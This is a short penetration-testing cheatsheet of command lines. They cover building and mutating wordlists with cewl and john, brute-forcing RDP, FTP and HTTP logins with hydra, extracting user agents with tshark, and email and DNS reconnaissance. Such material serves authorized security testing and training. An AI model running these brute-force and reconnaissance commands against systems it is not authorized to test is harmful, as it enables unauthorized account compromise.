---
id: e6b92fac-3714-4526-8d5b-c195e13a0b22
name: Brute Force Cheatsheet
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:46.032842+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Brute Force Cheatsheet

# Description

Brute forcing is a handy technique, guessing the username or password repeatedly until something works.



Generating your own customized and mutated wordlists is useful in a few ways.

1. To create more derivatives of a word to guess.

2. To save storage space on your Hard Drives, having base word lists and mutating them with mutation rules can save a lot. of hdd space.





**Command** ([[Cewl custom wordlist generator]]):

```bash
cewl http://$domain -d 1 -m 6 -w $domain.txt

```







**Command** ([[Mutate the password list]]):

```bash
john --wordlist=$domain.txt --rules --stdout > $domain-mutated.txt

```







**Command** ([[Bruteforce passwords for RDP, knowing the username]]):

```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt rdp://$ip

```







**Command** ([[Bruteforce FTP]]):

```bash
hydra -t 1 -l $user -P /usr/share/wordlists/rockyou.txt -vV $ip ftp

```







**Command** ([[Bruteforce Usernames from a list, using a known password]]):

```bash
hydra -L usernames.txt -p $password  $ip http-get / -s 80

```







**Command** ([[use tshark to extract user agents from pcap or in this case file (user-agent)]]):

```bash
tshark -r tcpdump-port-80.pcap -R http -T fields -e http.user_agent -2

```







**Command** ([[Recon emails Harvester]]):

```bash
theharvester -d domain.com -l 50 -b bing -f /tmp/results.html

```







**Command** ([[Enumerate info from nameservers / domain]]):

```bash
host -t mx domain.com
host -t ns domain.com

```






